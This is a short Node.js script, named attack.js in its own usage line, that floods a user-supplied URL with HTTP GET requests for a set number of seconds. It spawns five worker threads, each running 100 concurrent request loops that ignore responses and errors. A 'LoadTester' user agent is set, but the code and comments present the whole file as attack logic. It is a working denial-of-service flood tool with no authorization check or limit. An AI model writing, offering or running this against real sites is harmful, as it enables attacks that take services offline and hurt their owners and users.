const http = require('http');
const https = require('https');
const { URL } = require('url');
const { Worker, isMainThread, parentPort } = require('worker_threads');

if (process.argv.length < 4) {
  console.log('USAGE: node attack.js https://target.com time_in_seconds');
  process.exit(1);
}

const target = new URL(process.argv[2]);
const duration = parseInt(process.argv[3]) * 1000;
const endTime = Date.now() + duration;

const isHttps = target.protocol === 'https:';
const client = isHttps ? https : http;

const options = {
  hostname: target.hostname,
  port: target.port || (isHttps ? 443 : 80),
  path: target.pathname + target.search,
  method: 'GET',
  headers: {
    'User-Agent': 'LoadTester/1.0',
    'Connection': 'keep-alive'
  }
};

function sendRequest() {
  if (Date.now() > endTime) return;

  const req = client.request(options, res => {
    // Ignore response body
    res.on('data', () => {});
    res.on('end', sendRequest); // Send next request when done
  });

  req.on('error', () => {
    // Ignore errors and keep going
    sendRequest();
  });

  req.end();
}

function workerFunction() {
  // This function will be executed by each worker.
  const concurrentRequests = 100; // Number of concurrent requests per worker.
  for (let i = 0; i < concurrentRequests; i++) {
    sendRequest();
  }
}

if (isMainThread) {
  // Main thread: spawn multiple worker threads for parallel execution.
  function spawnWorkers(workerCount) {
    for (let i = 0; i < workerCount; i++) {
      new Worker(__filename); // Spawn a new worker for each thread.
    }
  }

  // Spawn 5 workers (adjust the number based on your system's resources)
  spawnWorkers(5);
} else {
  // Worker thread: run the attack logic.
  workerFunction();
}
